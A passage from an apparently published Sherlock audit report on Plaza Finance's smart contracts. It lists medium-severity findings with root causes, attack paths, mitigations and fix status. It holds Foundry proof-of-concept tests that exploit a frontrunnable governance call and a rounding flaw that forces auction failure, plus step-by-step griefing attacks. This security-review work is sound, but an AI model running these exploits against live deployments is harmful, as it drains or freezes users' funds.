Other scenarios can happen too, such as a late user calling `PreDeposit::deposit` function at the last possible moment, after governance already called `setBondAndLeverageAmount`, but I think one scenario is enough to showcase this issue.

**Additional note:** frontrunning in this scenario doesn't have to be intentional. Same result will be achieved if a regular user decides to withdraw at the same time as governance calls `setBondAndLeverageAmount`. It should not matter whether an attacker or a regular user makes the withdrawal, the issue exists and is possible. Additionally, due to the nature of blockchains, the attacker's transaction can be executed earlier than governance's just by pure luck and that will have consequences as described in this finding report.

### Root Cause

Root cause - wrong modifier on `setBondAndLeverageAmount` function.

https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/PreDeposit.sol#L204

Modifier in question:

```solidity
    modifier checkDepositNotEnded() {
@>      if (block.timestamp >= depositEndTime) revert DepositEnded();
        _;
    }
```

### Internal Pre-conditions

Governance has to call `setBondAndLeverageAmount` function just before the deposit phase ends, which I think is likely, because if they call it earlier, they would have to call it again if any users call `deposit` or `withdraw` during that time.

### External Pre-conditions

None.

### Attack Path

Described in `Summary` section.

### Impact

This issue leads to incorrect total supplies of `bondETH` and `levETH` (unhealthy market state), big differences in user token balances and unfairness during coupon distribution.

### PoC

1. Create a new file in the `test` folder and name it `TestSetBondAndLeverageAmount.t.sol`
2. Paste the code provided below into the file:

<details>
<summary>Code</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

import {Pool} from "../src/Pool.sol";
import {Token} from "./mocks/Token.sol";
import {Utils} from "../src/lib/Utils.sol";
import {BondToken} from "../src/BondToken.sol";
import {PreDeposit} from "../src/PreDeposit.sol";
import {Distributor} from "../src/Distributor.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {Deployer} from "../src/utils/Deployer.sol";
import {LeverageToken} from "../src/LeverageToken.sol";
import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {PausableUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol";
import {OracleFeeds} from "../src/OracleFeeds.sol";
import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";

contract TestSetBondAndLeverageAmount is Test {
    PreDeposit public preDeposit;
    Token public reserveToken;
    Token public couponToken;

    address user1 = address(2);
    address user2 = address(3);
    address nonOwner = address(4);

    PoolFactory private poolFactory;
    PoolFactory.PoolParams private params;
    Distributor private distributor;

    address private deployer = address(0x5);
    address private minter = address(0x6);
    address private governance = address(0x7);

    address public constant ethPriceFeed = address(0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70);

    uint256 constant INITIAL_BALANCE = 1000 ether;
    uint256 constant RESERVE_CAP = 100 ether;
    uint256 constant DEPOSIT_AMOUNT = 10 ether;
    uint256 constant BOND_AMOUNT = 50 ether;
    uint256 constant LEVERAGE_AMOUNT = 50 ether;
    address private oracleFeedsContract;
    MockPriceFeed private mockPriceFeed;
    uint256 private constant CHAINLINK_DECIMAL_PRECISION = 10 ** 8;
    uint8 private constant CHAINLINK_DECIMAL = 8;

    function setUp() public {
        // Set block time to 10 days in the future to avoid block.timestamp to start from 0
        vm.warp(block.timestamp + 10 days);

        vm.startPrank(governance);

        reserveToken = new Token("Wrapped ETH", "WETH", false);
        couponToken = new Token("USDC", "USDC", false);
        vm.stopPrank();

        setUp_PoolFactory();

        vm.startPrank(governance);

        params = PoolFactory.PoolParams({
            fee: 0,
            reserveToken: address(reserveToken),
            couponToken: address(couponToken),
            distributionPeriod: 90 days,
            sharesPerToken: 2 * 10 ** 6,
            feeBeneficiary: address(0)
        });

        preDeposit = PreDeposit(
            Utils.deploy(
                address(new PreDeposit()),
                abi.encodeCall(
                    PreDeposit.initialize,
                    (
                        params,
                        address(poolFactory),
                        block.timestamp,
                        block.timestamp + 7 days,
                        RESERVE_CAP,
                        "",
                        "",
                        "",
                        ""
                    )
                )
            )
        );

        vm.stopPrank();

        vm.startPrank(deployer);

        OracleFeeds(oracleFeedsContract).setPriceFeed(params.reserveToken, address(0), ethPriceFeed, 99 days);

        // Deploy the mock price feed
        mockPriceFeed = new MockPriceFeed();

        // Use vm.etch to deploy the mock contract at the specific address
        bytes memory bytecode = address(mockPriceFeed).code;
        vm.etch(ethPriceFeed, bytecode);

        // Set oracle price
        mockPriceFeed = MockPriceFeed(ethPriceFeed);
        mockPriceFeed.setMockPrice(3000 * int256(CHAINLINK_DECIMAL_PRECISION), uint8(CHAINLINK_DECIMAL));

        vm.stopPrank();

        vm.startPrank(governance);
        poolFactory.grantRole(poolFactory.POOL_ROLE(), governance);
        vm.stopPrank();
    }

    function setUp_PoolFactory() internal {
        vm.startPrank(deployer);

        address contractDeployer = address(new Deployer());
        oracleFeedsContract = address(new OracleFeeds());

        address poolBeacon = address(new UpgradeableBeacon(address(new Pool()), governance));
        address bondBeacon = address(new UpgradeableBeacon(address(new BondToken()), governance));
        address levBeacon = address(new UpgradeableBeacon(address(new LeverageToken()), governance));
        address distributorBeacon = address(new UpgradeableBeacon(address(new Distributor()), governance));

        poolFactory = PoolFactory(
            Utils.deploy(
                address(new PoolFactory()),
                abi.encodeCall(
                    PoolFactory.initialize,
                    (
                        governance,
                        contractDeployer,
                        oracleFeedsContract,
                        poolBeacon,
                        bondBeacon,
                        levBeacon,
                        distributorBeacon
                    )
                )
            )
        );

        vm.stopPrank();
    }

    function testAttackerFrontrunsSetBondAndLeverageAmountCall() public {
        uint256 maliciousUserAmount = 50 ether;
        address maliciousUser = makeAddr("malicious user");
        uint256 regularUserAmount = 1 ether;
        uint256 numberOfRegularUsers = 50;
        address[50] memory users;
        uint256 exampleBondAmount = 1500 ether;
        uint256 exampleLevAmount = 1500 ether;
        Pool.TokenType tokenTypeBond = Pool.TokenType.BOND;
        Pool.TokenType tokenTypeLev = Pool.TokenType.LEVERAGE;
        address[50] memory users2;

        // creating addresses for users
        for (uint256 i = 0; i < numberOfRegularUsers; i++) {
            users[i] = address(uint160(uint256(keccak256(abi.encodePacked(i + 999)))));
            users2[i] = address(uint160(uint256(keccak256(abi.encodePacked(i + 9999)))));
        }

        // malicious user deposits 50 ether
        vm.startPrank(maliciousUser);
        reserveToken.mint(maliciousUser, maliciousUserAmount);
        reserveToken.approve(address(preDeposit), maliciousUserAmount);
        preDeposit.deposit(maliciousUserAmount);
        vm.stopPrank();

        // all users deposit 1 ether each
        for (uint256 i = 0; i < numberOfRegularUsers; i++) {
            vm.startPrank(users[i]);
            reserveToken.mint(users[i], regularUserAmount);
            reserveToken.approve(address(preDeposit), regularUserAmount);
            preDeposit.deposit(regularUserAmount);
            vm.stopPrank();
        }

        vm.warp(block.timestamp + 604784); // 6.999 days pass (almost end of deposit phase)

        vm.startPrank(maliciousUser);
        preDeposit.withdraw(maliciousUserAmount); // malicious user frontruns `setBondAndLeverageAmount` call to decrease reserve token balance
        vm.stopPrank();

        vm.startPrank(governance);
        preDeposit.setBondAndLeverageAmount( // setting both amounts to 1500e18 just before deposit phase ends (governance decides amounts based on reserve token balance)
        exampleBondAmount, exampleLevAmount);

        // now bond/leverage amounts should be 750e18, since malicious user withdrew 50% of reserve token balance, but amounts get set to 1500e18

        vm.warp(block.timestamp + 16); // deposit phase ends

        // governance trying to set amounts after deposit phase ended results in revert
        vm.expectRevert();
        preDeposit.setBondAndLeverageAmount((exampleBondAmount - 750e18), (exampleLevAmount - 750e18));

        // the token amounts are wrong, because they don't match reserve token balance, but pool must be created, because there's no other way to get the user funds out or change the amounts

        poolFactory.grantRole(poolFactory.POOL_ROLE(), address(preDeposit));
        preDeposit.createPool(); // pool gets created, this contract gets minted too big amount of bond/leverage tokens
        address pool = preDeposit.pool();
        poolFactory.grantRole(poolFactory.SECURITY_COUNCIL_ROLE(), address(governance));
        Pool(pool).unpause();
        vm.stopPrank();

        address bondToken = address(Pool(preDeposit.pool()).bondToken());
        address levToken = address(Pool(preDeposit.pool()).lToken());

        // all users claim their tokens
        for (uint256 i = 0; i < numberOfRegularUsers; i++) {
            vm.startPrank(users[i]);
            preDeposit.claim();
            vm.stopPrank();
            console.log("user balance of bond token after claim:", BondToken(bondToken).balanceOf(users[i])); // 30000000000000000000 = 30e18
            console.log("user balance of lev token after claim:", LeverageToken(levToken).balanceOf(users[i])); // 30000000000000000000 = 30e18
        }

        // new users use same amount of reserve tokens as previous users in `PreDeposit` to create bond/lev tokens
        // they all receive very odd amounts that don't match the amounts of users who deposited in `PreDeposit`

        // p.s. if you scroll up and change `exampleBondAmount` and `exampleLevAmount` to 750e18 and run this test again, you will see that the users below get same amounts as previous users and everything is normal

        for (uint256 i = 0; i < numberOfRegularUsers; i++) {
            vm.startPrank(users2[i]);
            reserveToken.mint(users2[i], regularUserAmount);
            reserveToken.approve(pool, regularUserAmount);
            Pool(pool).create(tokenTypeBond, 0.5 ether, 0);
            Pool(pool).create(tokenTypeLev, 0.5 ether, 0);
            vm.stopPrank();
            console.log("user2 balance of bond token after create:", BondToken(bondToken).balanceOf(users2[i]));
            console.log("user2 balance of lev token after create:", LeverageToken(levToken).balanceOf(users2[i]));
        }
    }
}
```

</details>

3. Run the test using this command: `forge test --mt testAttackerFrontrunsSetBondAndLeverageAmountCall -vv`
4. Take a look at the logs shown in the terminal. You will see user balances of tokens who deposited in `PreDeposit` and then after that you will see user balances of tokens who called `Pool::create` after pool was created.
5. As you can see in this example scenario, the balances are obviously very different, and that confirms the issue.

### Mitigation

Simply change the modifier on `setBondAndLeverageAmount` function from `checkDepositNotEnded` to `checkDepositEnded`, to allow governance to call this function after deposit phase has ended and to set the correct values. This will ensure users cannot change the reserve token balance around the time of this function being called.

```diff
function setBondAndLeverageAmount(
        uint256 _bondAmount,
        uint256 _leverageAmount
-   ) external onlyOwner checkDepositNotEnded {
+   ) external onlyOwner checkDepositEnded {
```

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/160




# Issue M-6: Auction date will drift irreversibly forward over time leading to loss of yield for bond holders 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/446 

## Found by 
0x52

### Summary

During the creation of the auction, lastDistribution is set to block.timestamp. Delays are compounding and will lead to loss of yield over time as the subsequent distribution will be delayed.

[Pool.sol#L530-L571](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L530-L571)

        function startAuction() external whenNotPaused() {
            // Check if distribution period has passed
    @>      require(lastDistribution + distributionPeriod < block.timestamp, DistributionPeriodNotPassed());

            // Check if auction period hasn't passed
            require(lastDistribution + distributionPeriod + auctionPeriod >= block.timestamp, AuctionPeriodPassed());

            ... SNIP

            // Update last distribution time
    @>      lastDistribution = block.timestamp;
        }

Above we see that lastDistribution is used to determine if the auction can be started. Additionally, lastDistribution is set to block.timestamp which means that any delay between lastDistribution + distributionPeriod and block.timestamp will cause loss of yield in the subsequent quarter.

According to sherlock rules a loss of 0.01% qualifies as medium impact. The distribution period is 1 quarter or 90 days which is 7 776 000 seconds. This means that a delay of 777.6 seconds (13 minutes) will break this threshold. Given that the start of the auction is expected to be within lastDistribution + distributionPeriod + auctionPeriod it is reasonable to assume that in real world conditions that a delay of this magnitude can and will happen.

### Root Cause

[Pool.sol#L570](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L570) sets lastDistribution == block.timestamp

### Internal preconditions

None

### External preconditions

startAuction is delayed by at least 777.6 seconds

### Attack Path

N/A

### Impact

Loss of yield for bond holders

### POC

N/A

### Mitigation

Instead of setting lastDistribution to `block.timestamp` is should be set to `lastDistribution + distributionPeriod`

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/163




# Issue M-7: Rounding loss in Auction#slotSize allows malicious user to force auction to be undersold 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/449 

## Found by 
0x52, 0xloophole, ZoA, bladeee, moray5554

### Summary

When an auction reaches the max number of bids it begins rolling the lowest bids off the list. To prevent high price low value bids from spamming out legitimate bids it enforces that the bid is a even division of slotSize(). This protection is not complete due to precision loss in it calculation. If a malicious user spams max number of bids of size == slotSize(), they can force and underfunded auction to occur, DOS'ing users and preventing funding.

### Root Cause

[Auction.sol#L382-L384](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L382-L384) does not account for precision loss allowing it to be exploited

### Internal preconditions

None

### External preconditions

None

### Attack Path

1. Spam max bids at size == slotSize
2. Wait for auction to end
3. End auction in failure
4. Refund all bids

### Impact

Bond payments can be indefinitely DOS'd due to forcing auctions to fail

### POC

Tests for all vulnerabilities can be found [here](https://gist.github.com/IAm0x52/05589415ce45af83aa4f7a5f63afbf45).

Insert the following test into Pool.t.sol

    function testDOSAuction() public {
        //test setup
        Token rToken = Token(params.reserveToken);
        Token cToken = Token(params.couponToken);

        vm.prank(user);
        address auction = Utils.deploy(
        address(new Auction()),
        abi.encodeWithSelector(
            Auction.initialize.selector,
            address(cToken),
            address(rToken),
            5000e6 + 1,
            block.timestamp + 1 days,
            10, // max bids set to 10 for simplicity of the test
            address(this),
            90
        ));

        cToken.mint(user, 1e18);
        cToken.mint(user2, 1e18);

        vm.prank(user);
        cToken.approve(auction, type(uint256).max);

        vm.prank(user2);
        cToken.approve(auction, type(uint256).max);

        vm.prank(user);
        Auction(auction).bid(1e6, 5000e6);
        
        for(uint i=0; i<10; i++){
        vm.prank(user2);
        Auction(auction).bid(0.05e6, 500e6);
        }

        vm.warp(Auction(auction).endTime());

        Auction(auction).endAuction();

        // auction has received a total of 10000e6 worth of bids but still fails due to rounding error
        assert(Auction(auction).state() == Auction.State.FAILED_UNDERSOLD);
    }

    Output:
    [PASS] testDOSAuction()

In the above test the auction receives a total of 10000e6 worth of bids but still fails as UNDERSOLD due to the issue described above.

### Mitigation

slotSize() should be `totalBuyCouponAmount / maxBids + 1` rather than `totalBuyCouponAmount / maxBids`

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/166




# Issue M-8: BalancerRouter is implemented incorrectly and will cause loss of funds when depositing to predeposits 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/455 

The protocol has acknowledged this issue.

## Found by 
0x52, wellbyt3

### Summary

The balancerRouter is intended to work with multiple balancers pools but it is implemented incorrect and can only works correctly with a single pool. This is because the balancerPoolToken is hard coded to a single pool token. This makes the balanceOf check highly dangerous when depositing to preDeposit contracts. Only the hardcoded token balance is checked, causing all of the desired BPT to become stuck. This will result in user funds becoming permanently lost.

[BalancerRouter.sol#L15-L21](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L15-L21)

        IVault public immutable balancerVault;
    @>  IERC20 public immutable balancerPoolToken;

        constructor(address _balancerVault, address _balancerPoolToken) {
            balancerVault = IVault(_balancerVault);
    @>      balancerPoolToken = IERC20(_balancerPoolToken);
        }

We see above that `balancerPoolToken` is an immutable variable set during construction.

[BalancerRouter.sol#L65-L90](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L65-L90)

        function joinBalancerPool(
            bytes32 poolId,
            IAsset[] memory assets,
            uint256[] memory maxAmountsIn,
            bytes memory userData
        ) internal returns (uint256) {

            ... SNIP

            // Join Balancer pool
    @>      uint256 balancerPoolTokenBalanceBefore = balancerPoolToken.balanceOf(address(this));
            balancerVault.joinPool(poolId, address(this), address(this), request);
    @>      uint256 balancerPoolTokenBalanceAfter = balancerPoolToken.balanceOf(address(this));

            return balancerPoolTokenBalanceAfter - balancerPoolTokenBalanceBefore;
        }

We see that when depositing it will always check the hardcoded address rather than the proper token. This means that it will return 0 when trying to deposit to other pools.

[BalancerRouter.sol#L23-L40](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L23-L40)

        function joinBalancerAndPredeposit(
            bytes32 balancerPoolId,
            address _predeposit,
            IAsset[] memory assets,
            uint256[] memory maxAmountsIn,
            bytes memory userData
        ) external nonReentrant returns (uint256) {
            // Step 1: Join Balancer Pool
    @>      uint256 balancerPoolTokenReceived = joinBalancerPool(balancerPoolId, assets, maxAmountsIn, userData);

            // Step 2: Approve balancerPoolToken for PreDeposit
            balancerPoolToken.safeIncreaseAllowance(_predeposit, balancerPoolTokenReceived);

            // Step 3: Deposit to PreDeposit
    @>      PreDeposit(_predeposit).deposit(balancerPoolTokenReceived, msg.sender);

            return balancerPoolTokenReceived;
        }

As a result of this `balancerPoolTokenReceived` will be 0. This will cause the tokens to be permanently stuck in the router causing complete loss of funds to the user.

### Root Cause

[balancerPoolToken](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L20) is hardcoded

### Internal preconditions

None

### External preconditions

None

### Attack Path

N/A

### Impact

Complete loss of user funds

### POC

N/A

### Mitigation

`balancerPoolToken` should be retrieved dynamically from the vault.

# Issue M-9: Market rate never used due to decimal discrepancy 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/561 

## Found by 
0x52, 0xadrii, 0xc0ffEE, Hueber, Ryonen, X0sauce, ZoA, bretzel, farman1094, future, fuzzysquirrel, shui, stuart\_the\_minion, tinnohofficial

### Summary

A decimal precision mismatch between `marketRate ` (18 decimal precision) and `redeemRate ` (6 decimal precision) in `Pool.sol` will cause the market rate to never be used.

### Root Cause

In [`Pool.sol#L512-L516`](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L512-L516), the `redeemRate` is calculated and implicitly uses a precision of 6 decimal precision : 
- [Pool#512](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L512)
- [Pool#516](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L514)
- [Pool#516](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L516) : The constant `BOND_TARGET_PRICE = 100` multiplied by `PRECISION = 1e6` = 100e6.

However, the `marketRate` will be [normalized](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L447) to 18dp : 
       The BPT token itself has 18 decimals ([`BalancerPoolToken.sol`](https://github.com/balancer/balancer-v2-monorepo/blob/master/pkg/pool-utils/contracts/BalancerPoolToken.sol)) so `totalSupply()` is 18dp.
     When calculating the price of a BPT it will formalize each price of the asset of the BPT pool to 18dp :  "balancer math works with 18 dec" [BalancerOracleAdapter.sol#L109](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerOracleAdapter.sol#L109). 
    It implies that the `decimals` of  [BalancerOracleAdapter](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerOracleAdapter.sol#L51) is set to 18.
Then the final value will have a precision of 18dp.

The comparison `marketRate < redeemRate` will always be false due to this difference in decimal precision.

### Internal Pre-conditions

1. A Chainlink price feed for the bond token must exist and be registered in `OracleFeeds`.
2. The `marketRate` from the Balancer oracle is lower than the calculated `redeemRate` when both are expressed with the same decimal precision.
3. `getOracleDecimals(reserveToken, USD)` returns 18

### External Pre-conditions

N/A

### Attack Path

1. A user initiates a redeem transaction.
2. The `simulateRedeem` and `getRedeemAmount` functions are called.
3. The condition `marketRate < redeemRate` evaluates to false due to the decimal mismatch.
4. The `redeemRate`, which might be higher than the actual market rate, is used to calculate the amount of reserve tokens the user receives.

### Impact

The intended functionality of considering the market rate for redemptions is completely bypassed.
Users redeeming tokens might receive more reserve tokens than expected if the true market rate (with correct decimals) is lower than the calculated `redeemRate`.

### PoC

N/A

### Mitigation

Change the normalization in `simulateRedeem` to use the  `bondToken.SHARES_DECIMALS()` instead of `oracleDecimals`.

```solidity
uint256 marketRate;
address feed = OracleFeeds(oracleFeeds).priceFeeds(address(bondToken), USD);
uint8 sharesDecimals = bondToken.SHARES_DECIMALS(); // Get the decimals of the shares

if (feed != address(0)) {
    marketRate = getOraclePrice(address(bondToken), USD).normalizeAmount(
        getOracleDecimals(address(bondToken), USD), 
        sharesDecimals // Normalize to sharesDecimals
    );
}
```

Modify the normalization of `marketRate` in `Pool.sol`'s `simulateRedeem` function to use the same decimal precision as `redeemRate` (6 decimals).  Specifically, change the normalization to use `bondToken.SHARES_DECIMALS()` instead of `oracleDecimals`:

```diff
 if (feed != address(0)) {
+ uint8 sharesDecimals = bondToken.SHARES_DECIMALS(); // Use sharesDecimals for consistent precision
  marketRate = getOraclePrice(address(bondToken), USD)
        .normalizeAmount(
          getOracleDecimals(address(bondToken), USD),
-          oracleDecimals // this is the decimals of the reserve token chainlink feed
+         sharesDecimals
        );


 }
 return getRedeemAmount(tokenType, depositAmount, bondSupply, levSupply, poolReserves, getOraclePrice(reserveToken, USD), oracleDecimals, marketRate)
         .normalizeAmount(COMMON_DECIMALS, IERC20(reserveToken).safeDecimals());

```

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/156




# Issue M-10: User can always inflate the `totalSellReserveAmount` variable to block the auction from being ended 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/723 

The protocol has acknowledged this issue.

## Found by 
0x23r0, 0xDazai, 0xRaz, 0xc0ffEE, 0xmystery, AuditorPraise, Aymen0909, Benterkii, Boy2000, Chain-sentry, ChainProof, DenTonylifer, Hurley, KiroBrejka, Nave765, Ryonen, Saurabh\_Singh, Waydou, ZoA, aswinraj94, copperscrewer, elolpuer, evmboi32, farismaulana, gegul, krishnambstu, moray5554, novaman33, pashap9990, queen, rudhra1749, sl1, solidityenj0yer, t0x1c, zxriptor

### Summary

User can always inflate the [`totalSellReserveAmount`](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L151) variable to block the auction from being ended. This is an extremely and cheap attack to perform because the user practically loses nothing. He can call the [`Auction::bid`](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L125) function right before the end of the auction with some enormous `buyReserveAmount` as input. This will brick the money flow because he can do it over and over again for every auction, resulting in unprofitable investments for the people who hold `bondETH`


### Root Cause

`totalSellReserveAmount` being easily inflatable without any checks to prevent it 

### Internal Pre-conditions

User making a valid bid with enormous `buyReserveAmount` as input, right before the end of the auction

### External Pre-conditions

None

### Attack Path

1. User waits until for example 1 second before the end of the auction
2. Then he calls the bid function, making a valid bid with big `buyReserveAmount` input

With this the attack is already performed. After this happens and someone call the `Auction::endAuction` function, the auction will be in `FAILED_POOL_SALE_LIMIT` state because of this check:
```solidity
        } else if (
            totalSellReserveAmount >=
            (IERC20(sellReserveToken).balanceOf(pool) * poolSaleLimit) / 100
        ) 
```

### Impact

The money flow can be bricked and a user can purposefully bring every auction to `FAILED_POOL_SALE_LIMIT` for no cost at all, since he can just call the `Auction::claimRefund` function afterwords 

### PoC

None

### Mitigation

_No response_

# Issue M-11: Protocol mechanics incorrectly assume 1 USDC will always be worth 1 USD 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/797 

The protocol has acknowledged this issue.

## Found by 
0xadrii, PNS

### Summary

The protocol mechanics assume 1 USDC == 1 USD. This is incorrect, and could lead to a loss of funds for users in case USDC depegs.

### Root Cause

Plaza is [designed to force bondETH to be worth 100 USDC](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/ab5bbd7d54042e4444b711a32def5b639fbd63b4/plaza-evm/src/Pool.sol#L325). This is mentioned several times accross the documentation, and can also be seen in the mint/redeem calculations in the codebase, where `BOND_TARGET_PRICE` is set to 100 to force the 100 USDC price:

```solidity
// Pool.sol
function getCreateAmount(
        TokenType tokenType,
        uint256 depositAmount,
        uint256 bondSupply,
        uint256 levSupply,
        uint256 poolReserves,
        uint256 ethPrice,
        uint8 oracleDecimals
    ) public pure returns (uint256) {
        ...

        // Compute collateral level, in PRECISION decimals
        uint256 collateralLevel = (tvl * PRECISION) / 
            (bondSupply * BOND_TARGET_PRICE); 

```

We can also be sure that `BOND_TARGET_PRICE` refers to 100 USDC and not 100 USD, given that the protocol Auction system is designed to distribute the bonds in the form of USDC, and the total amount of coupons to distribute is computed by considering the current supply of bond tokens and a fixed amount of USDC (given by `sharesPerToken`) per bond token:

```solidity
// File: Pool.sol

function startAuction() external whenNotPaused {
        ...

        // Normalize bondETH supply
        uint256 normalizedTotalSupply = bondToken.totalSupply().normalizeAmount(
            bondDecimals,
            maxDecimals
        );
	
			 // Normalize shares (USDC) amount 
        uint256 normalizedShares = sharesPerToken.normalizeAmount(
            sharesDecimals,
            maxDecimals
        );

        // Calculate the coupon amount to distribute
        uint256 couponAmountToDistribute = (normalizedTotalSupply * 
            normalizedShares).toBaseUnit(
                maxDecimals * 2 - IERC20(couponToken).safeDecimals()
            );
       
       ...
	}
```

This makes it clear that the protocol aims at pricing bond tokens in USDC, and not in USD.

The problem is that this leads to Plaza incorrectly assuming that 1 USDC == 1 USD. When computing the amount of tokens to mint, the total TVL in the pool is computed in **USD, instead of USDC:**

```solidity
// File: Pool.sol

function simulateCreate(
        TokenType tokenType,
        uint256 depositAmount
    ) public view returns (uint256) {
        ...

        return
            getCreateAmount(
                tokenType,
                depositAmount,
                bondSupply,
                levSupply,
                poolReserves,
                getOraclePrice(reserveToken, USD), // <---- !! The price for the reserve token is fetched in USD, not USDC
                getOracleDecimals(reserveToken, USD)
            ).normalizeAmount(COMMON_DECIMALS, assetDecimals);
    }
```

Then, in `getCreateAmount`, the TVL will be computed in USD, making the numerator in the `collateralLevel` calculation be in USD, but the denominator be in USDC:

```solidity
// File: Pool.sol

function getCreateAmount(
        TokenType tokenType,
        uint256 depositAmount,
        uint256 bondSupply,
        uint256 levSupply,
        uint256 poolReserves,
        uint256 ethPrice,
        uint8 oracleDecimals
    ) public pure returns (uint256) {
       ...
        uint256 tvl = (ethPrice * poolReserves).toBaseUnit(oracleDecimals);

        uint256 collateralLevel = (tvl * PRECISION) / 
            (bondSupply * BOND_TARGET_PRICE); 

				...
				
		}
```

This can lead to an incorrect computation of the pool’s current collateral level in case USDC depegs, effectively leading to a loss of funds.

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

Considering the following scenario:

- The current `poolReserves` is 100 WETH.
- The `ethPrice` reported by the oracle is $3000.
- The `bondSupply` is 28.

In normal conditions (USDC is at peg with USD), the collateral level would be below the `COLLATERAL_THRESHOLD`, and the mint/redeem computations for bond and leverage tokens should be done considering the case where `COLLATERAL_THRESHOLD` < 1.2:

- `TVL` = 100 WETH * 3000 = $300000
- `bondExpectedValuation` = 28 * `BOND_TARGET_PRICE` = $2800
- `collateralLevel` **≈** `TVL` / `bondExpectedValuation` **≈** 107.14, which is **below** the `COLLATERAL_THRESHOLD`.

However, in case USDC depegs, say to $0.90 per USDC, the real TVL and collateral levels should be:

- `TVL` = 100 WETH * 3000 = $300000
- bond expected valuation = 23 * `BOND_TARGET_PRICE` * 0,90 = $**2070**

`collateralLevel` **≈** `TVL` / `bondExpectedValuation` **≈ 144,** which is above the `COLLATERAL_THRESHOLD`.

> Note: USDC hit an all-time low to around $0.88 USD per USDC, more details [here](https://coinmarketcap.com/academy/article/explaining-the-silicon-valley-bank-fallout-and-usdc-de-peg).
>

### Impact

As demonstrated in the attack path, incorrectly considering that 1 USDC is always worth 1 USD could break the minting/redeeming expected mechanics, as the collateral level computations will be incorrect, effectively breaking the expected behavior of the protocol.

### PoC

_No response_

### Mitigation

Consider adding an oracle to convert the `bondExpectedValuation` to USD.

Another way to mitigate this issue is by computing the `TVL` in USDC, instead of USD. This would need changes in `getOraclePrice` function in the `OracleReader`, as an additional step should be included to convert from USD to USDC.

# Issue M-12: Approval overflow causes DoS in `BalancerRouter`'s `exitPlazaAndBalancer` 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/835 

## Found by 
0xadrii

### Summary

In `_exitBalancerPool`, the `BalancerRouter` contract will invoke `balancerPoolToken.safeIncreaseAllowance` in order to increase the allowance to the `balancerVault` by the desired `balancerPoolTokenIn`. This is incorrect, given that Balancer Pool Tokens by default have an inifinite allowance to the Balancer vault. This will lead to an overflow always being triggered when trying to approve the vault, effectively Dos’ing `exitPlazaAndBalancer`.

### Root Cause

In `BalancerRouter`'s `_exitBalancerPool` function, the router [tries to approve the BPT tokens to the `balancerVault`](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L140) in order to exit the pool:

```solidity
// File: BalancerRouter.sol

function _exitBalancerPool(
        bytes32 poolId,
        IAsset[] memory assets,
        uint256 balancerPoolTokenIn,
        uint256[] memory minAmountsOut,
        bytes memory userData,
        address to
    ) internal {
        IVault.ExitPoolRequest memory request = IVault.ExitPoolRequest({
            assets: assets,
            minAmountsOut: minAmountsOut,
            userData: userData,
            toInternalBalance: false
        });

        balancerPoolToken.safeIncreaseAllowance(address(balancerVault), balancerPoolTokenIn); 
        balancerVault.exitPool(poolId, address(this), payable(to), request);
    }
```

The problem is that BPT tokens **always have an inifinite allowance to the Balancer’s vault in order to save gas and avoid approvals.** This can be seen in [Balancers official `BalancerPoolToken.sol` implementation](https://github.com/balancer/balancer-v2-monorepo/blob/master/pkg/pool-utils/contracts/BalancerPoolToken.sol#L59-L60), where `allowance` always returns `uint256(-1)` if the `spender` is the vault, and is also mentioned explicitly in natspec: *“Override to grant the Vault infinite allowance, causing for Pool Tokens to not require approval.”*:

```solidity
// File: BalancerPoolToken.sol

/**
